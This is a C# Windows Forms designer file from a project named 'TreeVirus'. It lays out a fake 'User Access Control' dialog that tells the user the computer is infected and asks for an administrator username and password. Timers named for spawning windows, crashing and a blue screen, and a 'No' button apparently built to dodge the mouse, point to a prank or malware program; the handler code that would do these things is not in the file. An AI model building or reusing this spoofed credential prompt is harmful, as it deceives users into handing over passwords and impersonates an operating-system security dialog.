namespace TreeVirus
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.txbMessage = new System.Windows.Forms.RichTextBox();
            this.btnNo = new System.Windows.Forms.Button();
            this.tmrCheckMouse = new System.Windows.Forms.Timer(this.components);
            this.tmrBringToFront = new System.Windows.Forms.Timer(this.components);
            this.tmrOpenWindow = new System.Windows.Forms.Timer(this.components);
            this.timerUnsafeOpenWindow = new System.Windows.Forms.Timer(this.components);
            this.tmrSuperUnsafeOpenWindow = new System.Windows.Forms.Timer(this.components);
            this.tmrCrashOpenWindow = new System.Windows.Forms.Timer(this.components);
            this.tmrBSOD = new System.Windows.Forms.Timer(this.components);
            this.btnYes = new System.Windows.Forms.Button();
            this.tboxUName = new System.Windows.Forms.TextBox();
            this.tboxPassword = new System.Windows.Forms.TextBox();
            this.lblUName = new System.Windows.Forms.Label();
            this.lblPassword = new System.Windows.Forms.Label();
            this.SuspendLayout();
            // 
            // txbMessage
            // 
            this.txbMessage.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.txbMessage.Cursor = System.Windows.Forms.Cursors.Default;
            this.txbMessage.Location = new System.Drawing.Point(27, 12);
            this.txbMessage.MaxLength = 100;
            this.txbMessage.Name = "txbMessage";
            this.txbMessage.ReadOnly = true;
            this.txbMessage.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.None;
            this.txbMessage.Size = new System.Drawing.Size(241, 73);
            this.txbMessage.TabIndex = 1;
            this.txbMessage.Text = "Your computer appears to be infected by malware, most of the malware has been rem" +
    "oved but the rest requires administrative credentials to remove.";
            // 
            // btnNo
            // 
            this.btnNo.Location = new System.Drawing.Point(193, 222);
            this.btnNo.Name = "btnNo";
            this.btnNo.Size = new System.Drawing.Size(75, 23);
            this.btnNo.TabIndex = 2;
            this.btnNo.Text = "No";
            this.btnNo.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            this.btnNo.UseVisualStyleBackColor = true;
            this.btnNo.MouseEnter += new System.EventHandler(this.btnRemove_MouseEnter);
            this.btnNo.MouseLeave += new System.EventHandler(this.btnRemove_MouseLeave);
            this.btnNo.MouseHover += new System.EventHandler(this.btnRemove_MouseHover);
            // 
            // tmrCheckMouse
            // 
            this.tmrCheckMouse.Interval = 10;
            this.tmrCheckMouse.Tick += new System.EventHandler(this.tmrCheckMouse_Tick);
            // 
            // tmrBringToFront
            // 
            this.tmrBringToFront.Enabled = true;
            this.tmrBringToFront.Tick += new System.EventHandler(this.tmrBringToFront_Tick);
            // 
            // tmrOpenWindow
            // 
            this.tmrOpenWindow.Interval = 1;
            this.tmrOpenWindow.Tick += new System.EventHandler(this.tmrOpenWindow_Tick);
            // 
            // timerUnsafeOpenWindow
            // 
            this.timerUnsafeOpenWindow.Interval = 1;
            this.timerUnsafeOpenWindow.Tick += new System.EventHandler(this.timerUnsafeOpenWindow_Tick);
            // 
            // tmrSuperUnsafeOpenWindow
            // 
            this.tmrSuperUnsafeOpenWindow.Interval = 1;
            this.tmrSuperUnsafeOpenWindow.Tick += new System.EventHandler(this.tmrSuperUnsafeOpenWindow_Tick);
            // 
            // tmrCrashOpenWindow
            // 
            this.tmrCrashOpenWindow.Interval = 1;
            this.tmrCrashOpenWindow.Tick += new System.EventHandler(this.tmrCrashOpenWindow_Tick);
            // 
            // tmrBSOD
            // 
            this.tmrBSOD.Interval = 1;
            this.tmrBSOD.Tick += new System.EventHandler(this.tmrBSOD_Tick);
            // 
            // btnYes
            // 
            this.btnYes.Location = new System.Drawing.Point(112, 222);
            this.btnYes.Name = "btnYes";
            this.btnYes.Size = new System.Drawing.Size(75, 23);
            this.btnYes.TabIndex = 3;
            this.btnYes.Text = "Yes";
            this.btnYes.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            this.btnYes.UseVisualStyleBackColor = true;
            this.btnYes.MouseEnter += new System.EventHandler(this.btnYes_MouseEnter);
            this.btnYes.MouseLeave += new System.EventHandler(this.btnYes_MouseLeave);
            // 
            // tboxUName
            // 
            this.tboxUName.Location = new System.Drawing.Point(27, 91);
            this.tboxUName.Name = "tboxUName";
            this.tboxUName.Size = new System.Drawing.Size(226, 20);
            this.tboxUName.TabIndex = 4;
            // 
            // tboxPassword
            // 
            this.tboxPassword.Location = new System.Drawing.Point(27, 144);
            this.tboxPassword.Name = "tboxPassword";
            this.tboxPassword.PasswordChar = '*';
            this.tboxPassword.Size = new System.Drawing.Size(226, 20);
            this.tboxPassword.TabIndex = 5;
            this.tboxPassword.UseSystemPasswordChar = true;
            // 
            // lblUName
            // 
            this.lblUName.AutoSize = true;
            this.lblUName.Location = new System.Drawing.Point(24, 72);
            this.lblUName.Name = "lblUName";
            this.lblUName.Size = new System.Drawing.Size(55, 13);
            this.lblUName.TabIndex = 6;
            this.lblUName.Text = "Username";
            // 
            // lblPassword
            // 
            this.lblPassword.AutoSize = true;
            this.lblPassword.Location = new System.Drawing.Point(27, 125);
            this.lblPassword.Name = "lblPassword";
            this.lblPassword.Size = new System.Drawing.Size(53, 13);
            this.lblPassword.TabIndex = 7;
            this.lblPassword.Text = "Password";
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(280, 257);
            this.Controls.Add(this.lblPassword);
            this.Controls.Add(this.lblUName);
            this.Controls.Add(this.tboxPassword);
            this.Controls.Add(this.tboxUName);
            this.Controls.Add(this.btnYes);
            this.Controls.Add(this.btnNo);
            this.Controls.Add(this.txbMessage);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Fixed3D;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(300, 300);
            this.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(300, 300);
            this.Name = "Form1";
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "User Access Control";
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion
        private System.Windows.Forms.RichTextBox txbMessage;
        private System.Windows.Forms.Button btnNo;
        private System.Windows.Forms.Timer tmrCheckMouse;
        private System.Windows.Forms.Timer tmrBringToFront;
        private System.Windows.Forms.Timer tmrOpenWindow;
        private System.Windows.Forms.Timer timerUnsafeOpenWindow;
        private System.Windows.Forms.Timer tmrSuperUnsafeOpenWindow;
        private System.Windows.Forms.Timer tmrCrashOpenWindow;
        private System.Windows.Forms.Timer tmrBSOD;
        private System.Windows.Forms.Button btnYes;
        private System.Windows.Forms.TextBox tboxUName;
        private System.Windows.Forms.TextBox tboxPassword;
        private System.Windows.Forms.Label lblUName;
        private System.Windows.Forms.Label lblPassword;
    }
}

